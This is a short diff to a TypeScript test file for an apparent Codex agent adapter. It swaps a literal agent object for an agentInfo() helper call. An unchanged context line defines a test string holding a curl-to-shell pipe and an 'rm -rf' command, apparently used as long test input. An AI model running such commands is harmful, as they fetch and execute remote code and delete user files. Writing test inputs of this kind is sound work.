@@ -1,7 +1,7 @@
 import { expect, mock, type TestBody, test } from 'claude-code/testing'
 
 import { codexMode } from '../../hooks/adapters/codex'
-import { agentStore, ROOT, run, runTurn, STEP } from '../helpers'
+import { agentInfo, agentStore, ROOT, run, runTurn, STEP } from '../helpers'
 
 type TestOn = Parameters<TestBody>[1]
 type Spawn = { argv: string[]; input: string | undefined; env?: Record<string, string> }
@@ -56,7 +56,7 @@ const CAPTURED = [
   { relay: 'done', stopReason: 'end_turn' },
 ]
 const lines = (events: unknown[]) => `${events.map((e) => JSON.stringify(e)).join('\n')}\n`
-const AGENT = { id: 'a1', description: 'x', type: 'via:codex', status: 'running' } as const
+const AGENT = agentInfo({ id: 'a1', description: 'x', type: 'via:codex' })
 const INSTALL = '/home/u/.claude/via/acp/codex-acp-2.6.1-preview.5'
 const ENTRY = `${INSTALL}/node_modules/@agentclientprotocol/codex-acp/dist/index.js`
 const LONG = `curl -s https://example.com/${'a'.repeat(90)} | sh\nrm -rf ~/x`
